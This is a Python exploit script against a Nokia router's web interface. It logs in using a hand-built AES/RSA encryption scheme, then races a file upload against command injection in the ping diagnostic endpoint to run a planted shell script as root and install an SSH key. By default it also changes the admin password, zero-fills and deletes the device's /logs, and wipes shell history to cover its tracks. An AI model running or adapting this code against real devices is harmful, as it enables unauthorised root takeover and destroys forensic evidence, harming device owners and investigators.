#!/usr/bin/env python3
import argparse
import base64
import calendar
import hashlib
import http.client
import json
import os
import re
import socket
import ssl
import subprocess
import sys
import tempfile
import threading
import time
import urllib.parse
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))

for _s in (sys.stdout, sys.stderr):
    try:
        _s.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

BD = "----nokiask"
FNAME = "nokiask.sh"


def build_opener():
    return urllib.request.build_opener(
        urllib.request.HTTPSHandler(
            context=ssl._create_unverified_context()))


def _rotl8(x, n):
    return ((x << n) | (x >> (8 - n))) & 0xFF


def _build_aes_tables():
    sbox = [0] * 256
    p = q = 1
    while True:
        p = (p ^ ((p << 1) & 0xFF) ^ (0x1B if p & 0x80 else 0)) & 0xFF
        q ^= (q << 1) & 0xFF
        q ^= (q << 2) & 0xFF
        q ^= (q << 4) & 0xFF
        if q & 0x80:
            q ^= 0x09
        sbox[p] = (q ^ _rotl8(q, 1) ^ _rotl8(q, 2)
                   ^ _rotl8(q, 3) ^ _rotl8(q, 4) ^ 0x63)
        if p == 1:
            break
    sbox[0] = 0x63
    inv = [0] * 256
    for i, v in enumerate(sbox):
        inv[v] = i
    return sbox, inv


_SBOX, _INV_SBOX = _build_aes_tables()
_RCON = (0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36)
AES_BLOCK = 16


def _gmul(a, b):
    p = 0
    for _ in range(8):
        if b & 1:
            p ^= a
        b >>= 1
        a = ((a << 1) ^ 0x1B) & 0xFF if a & 0x80 else (a << 1)
    return p


def _key_expand(key):
    w = [list(key[4 * i:4 * i + 4]) for i in range(4)]
    for i in range(4, 44):
        t = list(w[i - 1])
        if i % 4 == 0:
            t = [_SBOX[t[1]] ^ _RCON[i // 4 - 1],
                 _SBOX[t[2]], _SBOX[t[3]], _SBOX[t[0]]]
        w.append([a ^ b for a, b in zip(w[i - 4], t)])
    return w


def _shift_rows(s):
    o = list(s)
    for row in range(1, 4):
        for col in range(4):
            o[col * 4 + row] = s[((col + row) % 4) * 4 + row]
    return o


def _inv_shift_rows(s):
    o = list(s)
    for row in range(1, 4):
        for col in range(4):
            o[((col + row) % 4) * 4 + row] = s[col * 4 + row]
    return o


def _mix_columns(s):
    o = [0] * 16
    for c in range(4):
        a = s[4 * c:4 * c + 4]
        o[4 * c + 0] = _gmul(a[0], 2) ^ _gmul(a[1], 3) ^ a[2] ^ a[3]
        o[4 * c + 1] = a[0] ^ _gmul(a[1], 2) ^ _gmul(a[2], 3) ^ a[3]
        o[4 * c + 2] = a[0] ^ a[1] ^ _gmul(a[2], 2) ^ _gmul(a[3], 3)
        o[4 * c + 3] = _gmul(a[0], 3) ^ a[1] ^ a[2] ^ _gmul(a[3], 2)
    return o


def _inv_mix_columns(s):
    o = [0] * 16
    for c in range(4):
        a = s[4 * c:4 * c + 4]
        o[4 * c + 0] = (_gmul(a[0], 14) ^ _gmul(a[1], 11)
                        ^ _gmul(a[2], 13) ^ _gmul(a[3], 9))
        o[4 * c + 1] = (_gmul(a[0], 9) ^ _gmul(a[1], 14)
                        ^ _gmul(a[2], 11) ^ _gmul(a[3], 13))
        o[4 * c + 2] = (_gmul(a[0], 13) ^ _gmul(a[1], 9)
                        ^ _gmul(a[2], 14) ^ _gmul(a[3], 11))
        o[4 * c + 3] = (_gmul(a[0], 11) ^ _gmul(a[1], 13)
                        ^ _gmul(a[2], 9) ^ _gmul(a[3], 14))
    return o


def _aes_enc_block(w, blk):
    s = [b ^ w[i // 4][i % 4] for i, b in enumerate(blk)]
    for rnd in range(1, 10):
        s = [_SBOX[b] for b in s]
        s = _shift_rows(s)
        s = _mix_columns(s)
        s = [s[i] ^ w[4 * rnd + i // 4][i % 4] for i in range(16)]
    s = [_SBOX[b] for b in s]
    s = _shift_rows(s)
    return bytes(s[i] ^ w[40 + i // 4][i % 4] for i in range(16))


def _aes_dec_block(w, blk):
    s = [b ^ w[40 + i // 4][i % 4] for i, b in enumerate(blk)]
    for rnd in range(9, 0, -1):
        s = _inv_shift_rows(s)
        s = [_INV_SBOX[b] for b in s]
        s = [s[i] ^ w[4 * rnd + i // 4][i % 4] for i in range(16)]
        s = _inv_mix_columns(s)
    s = _inv_shift_rows(s)
    s = [_INV_SBOX[b] for b in s]
    return bytes(s[i] ^ w[i // 4][i % 4] for i in range(16))


def pkcs7_pad(b: bytes) -> bytes:
    n = AES_BLOCK - len(b) % AES_BLOCK
    return b + bytes([n]) * n


def pkcs7_unpad(b: bytes) -> bytes:
    return b[: -b[-1]] if b and 0 < b[-1] <= AES_BLOCK else b


def aes_cbc_encrypt(key: bytes, iv: bytes, pt: bytes) -> bytes:
    w = _key_expand(key)
    out = b""
    prev = iv
    for i in range(0, len(pt), AES_BLOCK):
        blk = bytes(x ^ y for x, y in zip(pt[i:i + AES_BLOCK], prev))
        prev = _aes_enc_block(w, blk)
        out += prev
    return out


def aes_cbc_decrypt(key: bytes, iv: bytes, ct: bytes) -> bytes:
    w = _key_expand(key)
    out = b""
    prev = iv
    for i in range(0, len(ct), AES_BLOCK):
        blk = ct[i:i + AES_BLOCK]
        out += bytes(x ^ y for x, y in zip(_aes_dec_block(w, blk), prev))
        prev = blk
    return out


def rsa_pkcs1_encrypt(pub_der: bytes, msg: bytes) -> bytes:
    def der_int(buf, i):
        assert buf[i] == 0x02
        ln = buf[i + 1]
        j = i + 2
        if ln & 0x80:
            n = ln & 0x7F
            ln = int.from_bytes(buf[j:j + n], "big")
            j += n
        return int.from_bytes(buf[j:j + ln], "big"), j + ln

    def read_tag(buf, i, tag):
        assert buf[i] == tag, f"DER tag {buf[i]:#x} != {tag:#x}"
        ln = buf[i + 1]
        j = i + 2
        if ln & 0x80:
            n = ln & 0x7F
            ln = int.from_bytes(buf[j:j + n], "big")
            j += n
        return j + ln, ln

    end, _ = read_tag(pub_der, 0, 0x30)
    i = 2 + (pub_der[1] & 0x7F if pub_der[1] & 0x80 else 0)
    end1, _ = read_tag(pub_der, i, 0x30)
    i = end1
    endbs, lnbs = read_tag(pub_der, i, 0x03)
    i = endbs - lnbs + 1
    end2, ln2 = read_tag(pub_der, i, 0x30)
    n, j = der_int(pub_der, end2 - ln2)
    e, _ = der_int(pub_der, j)
    k = (n.bit_length() + 7) // 8
    padlen = k - 3 - len(msg)
    if padlen < 8:
        raise ValueError("message too long for RSA key")
    ps = bytes(os.urandom(padlen)).replace(b"\x00", b"\x01")
    em = b"\x00\x02" + ps + b"\x00" + msg
    c = pow(int.from_bytes(em, "big"), e, n)
    return c.to_bytes(k, "big")


def pem_to_der(pubkey_pem: str) -> bytes:
    t = pubkey_pem
    for marker in ("-----BEGIN PUBLIC KEY-----", "-----END PUBLIC KEY-----",
                   "-----BEGIN RSA PUBLIC KEY-----",
                   "-----END RSA PUBLIC KEY-----"):
        t = t.replace(marker, "")
    return base64.b64decode("".join(t.split()))


def b64url_escape(b) -> str:
    if isinstance(b, str):
        return b.replace("+", "-").replace("/", "_").replace("=", ".")
    return (base64.b64encode(b).decode()
            .replace("+", "-").replace("/", "_").replace("=", "."))


def b64url_sjcl(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def encrypt_payload(plaintext: str, pubkey_pem: str):
    aes_key = os.urandom(16)
    aes_iv = os.urandom(16)
    ct = aes_cbc_encrypt(aes_key, aes_iv, pkcs7_pad(plaintext.encode()))
    keyinfo = (base64.b64encode(aes_key) + b" " + base64.b64encode(aes_iv))
    rsa_ct = rsa_pkcs1_encrypt(pem_to_der(pubkey_pem), keyinfo)
    ct_field = b64url_sjcl(ct)
    ck_field = b64url_escape(rsa_ct)
    return f"encrypted=1&ct={ct_field}&ck={ck_field}", aes_key, aes_iv


def sjcl_b64url_decode(s: str) -> bytes:
    s = s.replace("-", "+").replace("_", "/")
    s += "=" * (-len(s) % 4)
    return base64.b64decode(s)


def decrypt_response(body: str, key: bytes, iv: bytes) -> str:
    ct = body
    try:
        j = json.loads(body)
        if isinstance(j, dict):
            ct = j.get("ct") or j.get("data") or body
    except Exception:
        pass
    try:
        pt = aes_cbc_decrypt(key, iv, sjcl_b64url_decode(ct.strip()))
        return pkcs7_unpad(pt).decode("utf-8", "replace")
    except Exception as e:
        return f"<decrypt failed: {e}> {body[:200]}"


class NokiaClient:
    def __init__(self, host, user, password, scheme="https"):
        self.base = f"{scheme}://{host}"
        self.user = user
        self.password = password
        self.pubkey = None
        self.basic = base64.b64encode(f"{user}:{password}".encode()).decode()
        self.opener = build_opener()
        self.sid = None
        self.token = None
        self.dec_key = None
        self.dec_iv = None

    def request(self, path, body=None, headers=None, timeout=20,
                use_session=False):
        url = self.base + path
        h = {}
        if use_session and self.sid:
            h["Cookie"] = f"sid={self.sid}"
        else:
            h["Authorization"] = "Basic " + self.basic
        if headers:
            h.update(headers)
        data = body.encode() if isinstance(body, str) else body
        req = urllib.request.Request(url, data=data, headers=h)
        resp = self.opener.open(req, timeout=timeout)
        raw = resp.read().decode("utf-8", "replace")
        hdrs = {k.lower(): v for k, v in resp.getheaders()}
        return resp.status, raw, hdrs

    def fetch_nonce(self):
        st, body, _ = self.request("/login_web_app.cgi?nonce")
        j = json.loads(body)
        if j.get("pubkey") and "-----BEGIN" not in j["pubkey"]:
            j["pubkey"] = ("-----BEGIN PUBLIC KEY-----\n" + j["pubkey"]
                           + "\n-----END PUBLIC KEY-----\n")
        return j

    def login(self):
        j = self.fetch_nonce()
        nonce = j["nonce"]
        rkey = j.get("randomKey", "0")
        self.pubkey = self.pubkey or j.get("pubkey")
        assert self.pubkey, "no pubkey available for encrypted login"
        nonce_esc = b64url_escape(nonce)
        self.dec_key = os.urandom(16)
        self.dec_iv = os.urandom(16)
        plain = (f"userhash={urllib.parse.quote(self.user)}"
                 f"&RandomKeyhash={urllib.parse.quote(rkey)}"
                 f"&response={urllib.parse.quote(self.password)}"
                 f"&nonce={nonce_esc}"
                 f"&enckey={b64url_escape(self.dec_key)}"
                 f"&enciv={b64url_escape(self.dec_iv)}"
                 f"&nohash=1&hPassword=")
        body, _, _ = encrypt_payload(plain, self.pubkey)
        st, raw, hdrs = self.request(
            "/login_web_app.cgi", body,
            headers={"Content-Type": "application/x-www-form-urlencoded"})
        pt = decrypt_response(raw, self.dec_key, self.dec_iv)
        json_part = pt
        if json_part.startswith("<decrypt failed"):
            json_part = json_part.split("> ", 1)[1] if "> " in json_part else ""
        self.sid = hdrs.get("x-sid")
        m = None
        for line in raw.splitlines() + pt.splitlines():
            if "Set-Cookie" in line and "sid=" in line and "deleted" not in line:
                m = line.split("sid=")[1].split(";")[0]
        self.sid = self.sid or m
        mt = re.search(r'"token"\s*:\s*"([^"]+)"', json_part)
        ms = re.search(r'"sid"\s*:\s*"([^"]+)"', json_part)
        self.token = mt.group(1) if mt else None
        self.sid = self.sid or (ms.group(1) if ms else None)
        return st, pt, hdrs


def web_netloc(host, scheme, port):
    if ":" in host:
        return host
    dflt = 443 if scheme == "https" else 80
    return host if port == dflt else "%s:%d" % (host, port)


def web_base(host, scheme, port):
    return "%s://%s" % (scheme, web_netloc(host, scheme, port))


def _cert_lines(der):
    fd, path = tempfile.mkstemp(suffix=".pem")
    try:
        with os.fdopen(fd, "w") as f:
            f.write(ssl.DER_cert_to_PEM_cert(der))
        d = ssl._ssl._test_decode_cert(path)
    finally:
        try:
            os.unlink(path)
        except OSError:
            pass

    def name(t):
        return ", ".join("%s=%s" % (k, v) for rdn in t for k, v in rdn)

    naf = d.get("notAfter", "")
    when = ""
    if naf:
        try:
            left = (calendar.timegm(time.strptime(naf, "%b %d %H:%M:%S %Y %Z"))
                    - time.time()) // 86400
            when = "(expires in %d days)" % left if left >= 0 else "(expired %d days ago)" % (-left)
        except ValueError:
            pass
    lines = [
        ("Subject", name(d.get("subject", ()))),
        ("Issuer", name(d.get("issuer", ()))),
        ("Serial", d.get("serialNumber", "?")),
        ("NotBefore", d.get("notBefore", "?")),
        ("NotAfter", (naf or "?") + " " + when),
    ]
    san = d.get("subjectAltName")
    if san:
        lines.append(("SAN", ", ".join("%s:%s" % kv for kv in san)))
    return lines


def _dwpad(s, w):
    vis = sum(2 if ord(ch) > 0x2E7F else 1 for ch in s)
    return s + " " * max(0, w - vis)


def show_cert(host, port, timeout=10):
    h = host.split(":")[0]
    print("[*] Fetching certificate from https://%s:%d ..." % (h, port), flush=True)
    try:
        s = socket.create_connection((h, port), timeout=timeout)
    except Exception as e:
        print("[!] Cannot reach %s:%d (%s) — check address/port; use --yes to try anyway"
              % (h, port, str(e)[:120]), flush=True)
        return False
    try:
        ctx = ssl._create_unverified_context()
        tls = ctx.wrap_socket(s, server_hostname=h)
    except Exception as e:
        try:
            s.close()
        except Exception:
            pass
        print("[!] TLS handshake failed (%s) — there may be no HTTPS on %s:%d"
              % (str(e)[:120], h, port), flush=True)
        return False
    try:
        der = tls.getpeercert(binary_form=True)
    finally:
        tls.close()
    if not der:
        print("[!] Server did not present a certificate", flush=True)
        return False

    print("[*] ---- Server certificate ----", flush=True)
    for k, v in _cert_lines(der):
        print("    %s %s" % (_dwpad(k, 16), v), flush=True)
    print("    %s %s" % (_dwpad("SHA-256 fingerprint", 16),
                         ":".join("%02x" % b for b in hashlib.sha256(der).digest())),
          flush=True)
    try:
        ans = input("[?] If the target looks right: type any character + Enter to continue, or just Enter to cancel > ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        ans = ""
    if not ans:
        print("[!] Cancelled, nothing was done", flush=True)
    return bool(ans)


def make_payload(pubkey_path):
    pub = open(pubkey_path, encoding="utf-8").read().strip()
    tag = pub.split()[-1] if len(pub.split()) > 2 else "nokiasshkey"
    tpl = open(os.path.join(HERE, "payload.sh.tpl"), encoding="utf-8").read()
    return tpl.replace("__PUBKEY__", pub).replace("__TAG__", tag), tag


def build_body(tok, payload):
    return (("--%s\r\nContent-Disposition: form-data; name=\"csrf_token\"\r\n\r\n%s\r\n"
             % (BD, tok)).encode()
            + ("--%s\r\nContent-Disposition: form-data; name=\"filename\"; "
               "filename=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n"
               % (BD, FNAME)).encode()
            + payload.encode()
            + ("\r\n--%s--\r\n" % BD).encode())


def race(base, sid, tok, iface, seconds, payload, opener_up, opener_inj,
         quiet=False, n_up=2, n_inj=4):
    stat = {"up": 0, "inj": 0, "spa": 0, "err": 0, "slow": 0, "maxs": 0.0}
    stop = threading.Event()
    lock = threading.Lock()
    body = build_body(tok, payload)

    def uploader():
        while not stop.is_set():
            try:
                r = opener_up.open(urllib.request.Request(
                    base + "/usb_web_app.cgi?v=import&sl_num=usb1_1",
                    data=body,
                    headers={"Cookie": "sid=" + str(sid),
                             "Content-Type": "multipart/form-data; boundary=" + BD,
                             "Content-Length": str(len(body))}), timeout=30)
                r.read(); r.close()
                with lock:
                    stat["up"] += 1
            except Exception:
                with lock:
                    stat["err"] += 1
            time.sleep(0.05)

    def injector():
        payload_q = "--help%26/bin/sh%3C/tmp/" + FNAME
        b = ("csrf_token=" + tok + "&wan_conlist=2&ipaddress=" + payload_q
             + "&direction=&status=enable&domain=&wan_port=WAN"
             + "&waninterfacename=" + iface + "&portstatus=Connected&lan_port=LAN1"
             ).encode()
        while not stop.is_set():
            try:
                _t = time.time()
                r = opener_inj.open(urllib.request.Request(
                    base + "/troubleshooting_web_app.cgi?ping", data=b,
                    headers={"Cookie": "sid=" + str(sid),
                             "Content-Type":
                             "application/x-www-form-urlencoded"}), timeout=30)
                o = r.read().decode("utf-8", "replace"); r.close()
                dt = time.time() - _t
                with lock:
                    if "<!doctype" in o.lower():
                        stat["spa"] += 1
                        stat.setdefault("spa_sample", o[:400])
                    else:
                        stat["inj"] += 1
                    if dt > 3.0:
                        stat["slow"] += 1
                    if dt > stat["maxs"]:
                        stat["maxs"] = dt
            except Exception:
                with lock:
                    stat["err"] += 1
            time.sleep(0.05)

    threads = [threading.Thread(target=uploader, daemon=True) for _ in range(n_up)]
    threads += [threading.Thread(target=injector, daemon=True) for _ in range(n_inj)]
    for t in threads:
        t.start()
    t0 = time.time()
    while time.time() - t0 < seconds:
        time.sleep(5)
        if not quiet:
            print("   %3ds uploads=%d  inj ok=%d spa=%d err=%d slow=%d peak=%.1fs"
                  % (time.time() - t0, stat["up"], stat["inj"], stat["spa"], stat["err"],
                     stat["slow"], stat["maxs"]), flush=True)
    stop.set()
    time.sleep(1)
    return stat


def _fix_key_perms(path):
    try:
        if os.name == "nt":
            import getpass
            subprocess.run(["icacls", path, "/inheritance:r",
                            "/grant:r", getpass.getuser() + ":F"],
                           capture_output=True, check=True)
        else:
            os.chmod(path, 0o600)
    except Exception:
        pass


def ensure_keypair(key_path):
    pub = key_path + ".pub"
    if not os.path.exists(key_path):
        print("[*] %s not found; generating a temporary ed25519 keypair with ssh-keygen" % key_path,
              flush=True)
        subprocess.run(["ssh-keygen", "-t", "ed25519", "-N", "",
                        "-C", "nokia-v2", "-f", key_path, "-q"], check=True)
    if not os.path.exists(pub):
        p = subprocess.run(["ssh-keygen", "-y", "-f", key_path],
                           capture_output=True, check=True)
        with open(pub, "wb") as f:
            f.write(p.stdout.strip() + b"\n")
    _fix_key_perms(key_path)
    return pub


def _ssh_argv(key_path, host, port):
    return ["ssh", "-i", key_path,
            "-o", "IdentitiesOnly=yes",
            "-o", "BatchMode=yes",
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "PasswordAuthentication=no",
            "-o", "ConnectTimeout=15",
            "-o", "LogLevel=ERROR",
            "-p", str(port),
            "root@%s" % host]


def ssh_exec(host, key_path, script, timeout=180):
    p = subprocess.run(_ssh_argv(key_path, host, 22) + ["sh", "-s"],
                       input=script.encode(),
                       capture_output=True, timeout=timeout)
    return p.returncode, (p.stdout + p.stderr).decode("utf-8", "replace")


def ssh_check(host, key_path, timeout=20):
    rc, out = ssh_exec(host, key_path, "id; hostname; uname -sr", timeout)
    if rc != 0:
        raise OSError("ssh exit code %s: %s" % (rc, out.strip()[-200:]))
    return out


WIPE_LOGS_SH = r'''
echo "[*] /logs cleanup started $(date)"
df -k /logs
echo "[*] File count: $(find /logs -type f | wc -l)"


cfgcli -s "InternetGatewayDevice.X_Authentication.WebAccount.Password" "__WEB_PASSWORD__"
cfgcli --save-flash-now
echo "[*] (0) Web password set and committed to flash"

# (1) In-place overwrite: zero-fill each file at its original length,
#     reusing the existing blocks; free space is left untouched
find /logs -type f | while read -r f; do
    sz=$(stat -c%s "$f" 2>/dev/null)
    [ -n "$sz" ] && [ "$sz" -gt 0 ] || continue
    dd if=/dev/zero of="$f" bs=4096 conv=notrunc count=$(( (sz + 4095) / 4096 )) 2>/dev/null
done
sync
echo "[*] (1) Overwrite done $(date)"

# (2) Delete + recreate directories + restore original permissions
#    -mindepth 1 keeps the /logs mount point itself (drwxrwxrwt 1777)
find /logs -mindepth 1 -maxdepth 1 | xargs rm -rf
mkdir -p /logs/core /logs/err/recov /logs/pstore /logs/sec /logs/history
chmod 755 /logs/core /logs/err /logs/err/recov /logs/history
chmod 750 /logs/pstore
chmod 700 /logs/sec
chgrp 1100 /logs/history
sync
echo "[*] (2) Emptied + recreated"

_TOTAL=$(df -k /logs 2>/dev/null | awk 'NR==2{print $2}')
if dd if=/dev/zero of=/logs/.wipe bs=4k oflag=direct count=1 2>/dev/null; then
    _OF="oflag=direct"
else
    _OF=""
fi
rm -f /logs/.wipe; sync
echo "[*] (2b) Zero-fill start total=${_TOTAL}KB oflag='${_OF}'"

for _p in 64:90 8:95 4:97; do
    _bs=${_p%%:*}; _pct=${_p##*:}
    _USED=$(df -k /logs 2>/dev/null | awk 'NR==2{print $3}')
    _KB=$(( _TOTAL * _pct / 100 - _USED ))
    if [ "$_KB" -gt 0 ]; then
        dd if=/dev/zero of=/logs/.wipe bs=${_bs}k $_OF \
           count=$(( _KB / _bs )) 2>/dev/null
        sync
    fi
    rm -f /logs/.wipe; sync
    echo "[*] (2b) Filled to ${_pct}% (bs=${_bs}k target ${_KB}KB) $(date)"
done
echo "[*] (2b) Zero-fill done"

touch -d "$(date '+%Y-%m-%d %H:%M:%S')" /logs/.seed
echo "[*] (3) Time seed $(ls -l /logs/.seed)"


history -c 2>/dev/null
for h in "$HOME/.ash_history" /root/.ash_history /root/.bash_history \
         /.ash_history /tmp/.ash_history; do
    [ -f "$h" ] || continue
    sz=$(stat -c%s "$h" 2>/dev/null)
    [ -n "$sz" ] && [ "$sz" -gt 0 ] && \
        dd if=/dev/zero of="$h" bs=4096 conv=notrunc \
           count=$(( (sz + 4095) / 4096 )) 2>/dev/null
    rm -f "$h"
    echo "[*] (4) Cleared history file $h"
done
echo "[*] (4) Shell history cleared"

echo "[*] Final:"
ls -la /logs
df -k /logs
echo WIPE_OK
'''


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="192.168.12.1")
    ap.add_argument("--scheme", default="https", choices=("https", "http"),
                    help="WebUI protocol (default: https)")
    ap.add_argument("--port", type=int, default=443,
                    help="WebUI port (default: 443; certificate not verified)")
    ap.add_argument("--user", default="admin")
    ap.add_argument("--password", required=True, help="WebUI admin password")
    ap.add_argument("--iface", default="eth0.1999")
    ap.add_argument("--race", type=int, default=40, help="seconds to hold the race window")
    ap.add_argument("--up", type=int, default=2, help="number of uploader threads")
    ap.add_argument("--inj", type=int, default=4, help="number of injector threads")
    ap.add_argument("--payload", default=None,
                    help="use this file as the on-device script as-is (skips template rendering)")
    ap.add_argument("--pad", type=int, default=32,
                    help="append N KB of comment padding to widen the write->delete window (default 32; do not set 0)")
    ap.add_argument("--pubkey", default=os.path.join(HERE, "nokiakey.pub"))
    ap.add_argument("--key", default=os.path.join(HERE, "nokiakey"))
    ap.add_argument("--restore", action="store_true",
                    help="restore /root/.ssh/authorized_keys after the run (no shell, verification only)")
    ap.add_argument("--wipe-logs", dest="wipe_logs", action="store_true", default=True,
                    help="overwrite /logs in place after getting root (default: on)")
    ap.add_argument("--no-wipe-logs", dest="wipe_logs", action="store_false",
                    help="skip the /logs cleanup and only install the pubkey")
    ap.add_argument("--web-password", default="Admin@123",
                    help="before cleanup, set the Web admin password to this value and commit it to flash")
    ap.add_argument("--yes", action="store_true",
                    help="skip the pre-run certificate display/confirmation (for scripting)")
    a = ap.parse_args()

    if a.yes:
        pass
    elif a.scheme == "https":
        if not show_cert(a.host, a.port):
            return 1
    else:
        print("[*] http is plaintext, no certificate to show — skipping confirmation", flush=True)

    ensure_keypair(a.key)
    if a.payload:
        payload = open(a.payload, encoding="utf-8").read()
        tag = "custom"
    else:
        payload, tag = make_payload(a.pubkey)
    if a.pad:
        payload += "\n# " + ("-" * 60) + "\n"
        payload += "".join("# pad %06d %s\n" % (i, "x" * 48)
                           for i in range(a.pad * 16))

    netloc = web_netloc(a.host, a.scheme, a.port)
    base = web_base(a.host, a.scheme, a.port)
    print("[*] Public key: %s  (tag=%s)" % (a.pubkey, tag))
    print("[*] Target: %s  on-device script %d bytes" % (a.host, len(payload)), flush=True)
    print("[*] WebUI: %s  (TLS certificate not verified)" % base, flush=True)

    c = NokiaClient(netloc, a.user, a.password, scheme=a.scheme)
    c.login()
    print("[+] Session sid=%s" % c.sid, flush=True)

    if a.restore:
        print("[*] --restore: authorized_keys will be removed after the run")

    print("\n[*] Racing for the window for %ds ..." % a.race, flush=True)
    stat = race(base, c.sid, c.token or "", a.iface, a.race, payload,
                build_opener(), build_opener(),
                n_up=a.up, n_inj=a.inj)
    print("[*] Done: uploads %d  inject ok=%d spa=%d slow=%d peak=%.1fs"
          % (stat["up"], stat["inj"], stat["spa"], stat["slow"], stat["maxs"]),
          flush=True)
    if stat.get("spa_sample"):
        print("[*] spa response sample: %s"
              % stat["spa_sample"].replace("\n", " ")[:300], flush=True)

    print("\n[*] Verifying SSH ...", flush=True)
    try:
        out = ssh_check(a.host, a.key)
        print("    >>> root shell OK <<<")
        print("    " + out.strip().replace("\n", "\n    "))
    except Exception as e:
        print("    FAIL: %s" % str(e)[:150])
        print("    (the race is probabilistic — if it missed, just run again)")
        return 1

    tail = []
    steps = []
    if a.wipe_logs:
        if any(ch in a.web_password for ch in '"$`\\'):
            print("\n[!] --web-password contains one of \" $ ` \\ which would break shell quoting; refusing to run")
            return 1
        tail.append(WIPE_LOGS_SH.replace("__WEB_PASSWORD__", a.web_password))
        steps.append("set Web password + wipe /logs")
    if a.restore:
        tail.append("rm -f /root/.ssh/authorized_keys\necho KEY_REMOVED")
        steps.append("remove pubkey")

    if tail:
        print("\n[*] Post-run: %s" % " + ".join(steps), flush=True)
        try:
            rc, out = ssh_exec(a.host, a.key, "\n".join(tail))
            print("    " + out.strip().replace("\n", "\n    "))
            if a.wipe_logs and "WIPE_OK" not in out:
                print("    !!! WIPE_OK not seen (exit code %s) — possibly interrupted midway; run again" % rc)
        except Exception as e:
            print("    FAIL: %s" % str(e)[:150])
    else:
        print("\n[*] --no-wipe-logs: skipping /logs cleanup")

    print("\n[*] To get on the box:")
    print("    ssh -i %s root@%s" % (a.key, a.host))

    if a.restore:
        print("\n[*] Verifying the pubkey was removed ...", flush=True)
        try:
            ssh_check(a.host, a.key, timeout=10)
            print("    !!! Still connects — key was not removed")
        except Exception:
            print("    Removed (future connections will fail)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
